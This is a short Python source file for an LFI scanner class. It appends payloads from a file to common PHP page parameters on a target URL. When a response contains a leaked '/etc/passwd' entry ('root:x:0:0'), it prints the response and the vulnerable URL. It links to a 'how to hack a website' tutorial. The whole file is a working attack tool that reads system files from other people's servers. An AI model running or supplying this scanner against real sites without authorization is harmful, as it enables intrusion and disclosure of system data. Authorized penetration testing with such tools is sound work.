# about LFI: https://www.1337pwn.com/how-to-hack-a-website-using-local-file-inclusion-lfi/

import requests
import sys
from Scanners import Scanners

# arguments that will be added to url
url_args = ['index.php?page=', 'index.php?Page=', 'index.php?id=', 'index.php?addr=',
            'layout.php?page=', 'layout.php?Page=', 'layout.php?id=', 'layout.php?addr=']

class LFIScanner(Scanners):

    def __del__(self):
        print("[*] LFI scan Completed!")

    #get path to payloads
    @staticmethod
    def get_payloads_path():
        payloads_path = input('[*] Provide path to payloads: ')
        payloads_path_raw = r'{}'.format(payloads_path)         #formating string to raw string to prevent path issues
        try:                                                    #trying to open file
            f = open(payloads_path_raw, "r")
            print('[*] File found')
            f.close()
        except OSError:
           sys.exit("File can't be opened")
        return payloads_path_raw

    #lfi scan
    @staticmethod
    def lfi_scan(url, payloads_path):
        print('[*] Scanning for LFI')
        for arg in url_args:
            for payload in open(payloads_path, "r").readlines():
                url_try = url + arg + payload
                req = requests.get(url_try).text                        #trying url with arg and payload
                if "root:x:0:0" in req:                                 #looking for root data in received data
                    print(req)
                    print('[*] Full path to vulnerability: ', url_try)